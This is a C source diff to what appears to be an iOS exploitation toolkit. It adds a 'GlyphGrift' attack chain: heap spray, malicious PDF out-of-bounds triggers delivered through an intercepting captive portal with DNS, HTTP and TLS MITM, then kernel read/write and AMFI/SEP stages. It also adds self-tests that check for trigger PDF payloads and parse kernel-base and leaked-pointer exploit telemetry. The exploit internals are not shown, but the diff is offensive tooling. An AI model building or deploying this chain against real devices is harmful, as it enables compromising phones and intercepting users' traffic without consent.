@@ -78,6 +78,10 @@ static void print_help(const char *prog_name)
     printf("      --test-lockdown-bypass   Test unauthenticated lockdown SSL bypass & traversal\n");
     printf("      --setup-assistant-chain  Setup-safe path: Soft AP → captive WebSheet JS foothold\n");
     printf("                             (no sideload; stops at JS confirm — no fake kRW/activation)\n");
+    printf("      --glyphgrift-chain       GlyphGrift V2: spray → multi-PDF OOB → captive_krw → AMFI/SEP\n");
+    printf("                             (auto stages 5–8 after OOB path; no fake kRW/activation)\n");
+    printf("      --glyphgrift-vector <m>  PDF delivery: img (default) or embed (iframe/object)\n");
+    printf("      --glyphgrift-stack       Research-only stack PDF (DX=31); V2 exploit path is heap\n");
     printf("      --captive-server [port]  Start local DNS/HTTP/TLS captive portal server (default 8080)\n");
     printf("      --captive-dns-port <p>   Specify DNS responder port (default 5353, use 53 with root)\n");
     printf("      --captive-tls-port <p>   Specify TLS MITM inspector port (default 8443, use 443 with root)\n");
@@ -845,6 +849,132 @@ static int run_unit_tests(void)
                nvram_bridge_ok, done_signaled_ok, deact_ok);
     }
 
+    /* Test 17: GlyphGrift PDF payload existence & telemetry structure */
+    total++;
+    printf("Test 17: GlyphGrift PDF Payload Existence & Telemetry Structure... ");
+    {
+        captive_glyphgrift_result_t empty;
+        memset(&empty, 0, sizeof(empty));
+        captive_http_reset_glyphgrift_result();
+        bool reset_ok = !captive_http_get_glyphgrift_result(&empty);
+
+        static const char sample[] =
+            "{\"probe_id\":\"glyphgrift_pdf_trigger\",\"img_loaded\":false,"
+            "\"img_error\":true,\"render_time_ms\":12.5,\"canvas_exception\":false,"
+            "\"crash_suspected\":true,\"build\":\"23G83\",\"vector\":\"img\","
+            "\"error_message\":\"\"}";
+        captive_glyphgrift_result_t parsed;
+        bool parse_ok = (captive_http_parse_glyphgrift_result(sample, strlen(sample), &parsed) == 0 &&
+                         parsed.valid && parsed.img_error && parsed.crash_suspected &&
+                         parsed.render_time_ms > 12.0 && parsed.render_time_ms < 13.0 &&
+                         strcmp(parsed.build, "23G83") == 0);
+
+        bool pdf_ok = false;
+        static const char *pdf_candidates[] = {
+            "payloads/glyphgrift/trigger.pdf",
+            "./payloads/glyphgrift/trigger.pdf",
+            "l0fck/payloads/glyphgrift/trigger.pdf",
+            NULL
+        };
+        for (int i = 0; pdf_candidates[i]; i++) {
+            FILE *pf = fopen(pdf_candidates[i], "rb");
+            if (pf) {
+                fseek(pf, 0, SEEK_END);
+                long psz = ftell(pf);
+                fclose(pf);
+                if (psz > 0) {
+                    pdf_ok = true;
+                    break;
+                }
+            }
+        }
+
+        bool path_ok = (captive_http_glyphgrift_result_path() != NULL &&
+                        captive_http_glyphgrift_result_path()[0] != '\0');
+
+        if (reset_ok && parse_ok && pdf_ok && path_ok) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET
+                   " (reset=%d parse=%d pdf=%d path=%d)\n",
+                   reset_ok, parse_ok, pdf_ok, path_ok);
+        }
+    }
+
+    /* Test 18: GlyphGrift V2 exploit telemetry — crash ≠ krw_ready */
+    total++;
+    printf("Test 18: GlyphGrift Exploit Telemetry Structure & PDF Variants... ");
+    {
+        captive_http_reset_glyphgrift_exploit_result();
+        captive_glyphgrift_exploit_result_t empty;
+        memset(&empty, 0, sizeof(empty));
+        bool reset_ok = !captive_http_get_glyphgrift_exploit_result(&empty);
+
+        static const char crash_only[] =
+            "{\"corruption_detected\":false,\"relative_rw_achieved\":true,"
+            "\"krw_ready\":true,\"kbase\":\"0xfffffff007004000\",\"leaked_ptr\":0}";
+        /* Placeholder kbase 0xfffffff007004000 must be rejected even if flags claim ready */
+        captive_glyphgrift_exploit_result_t fake;
+        bool refuse_fake = (captive_http_parse_glyphgrift_exploit_result(
+                                crash_only, strlen(crash_only), &fake) == 0 &&
+                            !fake.krw_ready && fake.kbase == 0);
+
+        static const char crash_telem[] =
+            "{\"corruption_detected\":true,\"corrupted_buffer_index\":7,"
+            "\"corrupted_offset\":64,\"corrupted_value\":257,"
+            "\"relative_rw_achieved\":false,\"krw_ready\":false,\"kbase\":0}";
+        captive_glyphgrift_exploit_result_t crash_p;
+        bool crash_ok = (captive_http_parse_glyphgrift_exploit_result(
+                             crash_telem, strlen(crash_telem), &crash_p) == 0 &&
+                         crash_p.corruption_detected && !crash_p.krw_ready);
+
+        static const char ready_ok[] =
+            "{\"corruption_detected\":true,\"relative_rw_achieved\":true,"
+            "\"krw_ready\":true,\"kbase\":\"0xfffffff017004000\",\"leaked_ptr\":\"0xfffffff017123456\"}";
+        captive_glyphgrift_exploit_result_t ready;
+        bool ready_parse = (captive_http_parse_glyphgrift_exploit_result(
+                                ready_ok, strlen(ready_ok), &ready) == 0 &&
+                            ready.relative_rw_achieved && ready.krw_ready &&
+                            ready.kbase == 0xfffffff017004000ULL);
+
+        bool pdf_k128 = false, pdf_k192 = false;
+        static const char *cands[] = {
+            "payloads/glyphgrift/", "./payloads/glyphgrift/",
+            "l0fck/payloads/glyphgrift/", NULL
+        };
+        for (int i = 0; cands[i]; i++) {
+            char p128[256], p192[256];
+            snprintf(p128, sizeof(p128), "%strigger_k128.pdf", cands[i]);
+            snprintf(p192, sizeof(p192), "%strigger_k192.pdf", cands[i]);
+            FILE *a = fopen(p128, "rb");
+            FILE *b = fopen(p192, "rb");
+            if (a) {
+                fseek(a, 0, SEEK_END);
+                if (ftell(a) > 0) pdf_k128 = true;
+                fclose(a);
+            }
+            if (b) {
+                fseek(b, 0, SEEK_END);
+                if (ftell(b) > 0) pdf_k192 = true;
+                fclose(b);
+            }
+            if (pdf_k128 && pdf_k192) break;
+        }
+
+        bool path_ok = (captive_http_glyphgrift_exploit_result_path() != NULL &&
+                        captive_http_glyphgrift_exploit_result_path()[0] != '\0');
+
+        if (reset_ok && refuse_fake && crash_ok && ready_parse && pdf_k128 && pdf_k192 && path_ok) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET
+                   " (reset=%d refuse_fake=%d crash=%d ready=%d k128=%d k192=%d path=%d)\n",
+                   reset_ok, refuse_fake, crash_ok, ready_parse, pdf_k128, pdf_k192, path_ok);
+        }
+    }
+
     printf("\nSelf-Test Result: %d/%d tests passed cleanly.\n", passed, total);
     printf(ANSI_COLOR_CYAN "========================================================================" ANSI_COLOR_RESET "\n\n");
 
@@ -959,6 +1089,9 @@ int main(int argc, char **argv)
     int opt_bypass_watch = 0;
     int opt_captive = 0;
     int opt_setup_assistant_chain = 0;
+    int opt_glyphgrift_chain = 0;
+    int opt_glyphgrift_stack = 0;
+    glyphgrift_vector_t glyphgrift_vector = GLYPHGRIFT_VECTOR_IMG;
     int opt_test = 0;
     int opt_sovereign = 0;
     int opt_sovereign_lite = 0;
@@ -1042,6 +1175,9 @@ int main(int argc, char **argv)
         OPT_PMAP_ONDEVICE,
         OPT_PULL_PMAP_RESULT,
         OPT_SETUP_ASSISTANT_CHAIN,
+        OPT_GLYPHGRIFT_CHAIN,
+        OPT_GLYPHGRIFT_VECTOR,
+        OPT_GLYPHGRIFT_STACK,
         OPT_BUILD_APPLEAVE2_PAYLOAD,
         OPT_APPLEAVE2_DEPLOY,
         OPT_APPLEAVE2_STATUS,
@@ -1093,6 +1229,9 @@ int main(int argc, char **argv)
         { "pmap-ondevice",       required_argument, NULL, OPT_PMAP_ONDEVICE },
         { "pull-pmap-result",    no_argument,       NULL, OPT_PULL_PMAP_RESULT },
         { "setup-assistant-chain", no_argument,     NULL, OPT_SETUP_ASSISTANT_CHAIN },
+        { "glyphgrift-chain",      no_argument,     NULL, OPT_GLYPHGRIFT_CHAIN },
+        { "glyphgrift-vector",     required_argument, NULL, OPT_GLYPHGRIFT_VECTOR },
+        { "glyphgrift-stack",      no_argument,     NULL, OPT_GLYPHGRIFT_STACK },
         { "build-appleave2-payload", no_argument,   NULL, OPT_BUILD_APPLEAVE2_PAYLOAD },
         { "appleave2-deploy",      no_argument,     NULL, OPT_APPLEAVE2_DEPLOY },
         { "appleave2-status",      no_argument,     NULL, OPT_APPLEAVE2_STATUS },
@@ -1187,6 +1326,17 @@ int main(int argc, char **argv)
             case OPT_PMAP_ONDEVICE: pmap_ondevice_mode = optarg; break;
             case OPT_PULL_PMAP_RESULT: opt_pull_pmap_result = 1; break;
             case OPT_SETUP_ASSISTANT_CHAIN: opt_setup_assistant_chain = 1; break;
+            case OPT_GLYPHGRIFT_CHAIN: opt_glyphgrift_chain = 1; break;
+            case OPT_GLYPHGRIFT_VECTOR:
+                if (optarg && (strcasecmp(optarg, "embed") == 0 ||
+                               strcasecmp(optarg, "iframe") == 0 ||
+                               strcasecmp(optarg, "object") == 0)) {
+                    glyphgrift_vector = GLYPHGRIFT_VECTOR_EMBED;
+                } else {
+                    glyphgrift_vector = GLYPHGRIFT_VECTOR_IMG;
+                }
+                break;
+            case OPT_GLYPHGRIFT_STACK: opt_glyphgrift_stack = 1; break;
             case OPT_BUILD_APPLEAVE2_PAYLOAD: opt_build_appleave2_payload = 1; break;
             case OPT_APPLEAVE2_DEPLOY: opt_appleave2_deploy = 1; break;
             case OPT_APPLEAVE2_STATUS:
@@ -1237,6 +1387,17 @@ int main(int argc, char **argv)
         }
         cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
         return setup_assistant_chain_run(&cap_cfg, NULL);
+    }
+
+    if (opt_glyphgrift_chain) {
+        if (!cap_ports_customized && geteuid() == 0) {
+            cap_cfg.http_port = 80;
+            cap_cfg.dns_port = 53;
+            cap_cfg.tls_port = 443;
+        }
+        cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
+        return glyphgrift_chain_run(&cap_cfg, glyphgrift_vector,
+                                   opt_glyphgrift_stack != 0, NULL);
     }
 
     if (opt_captive) {
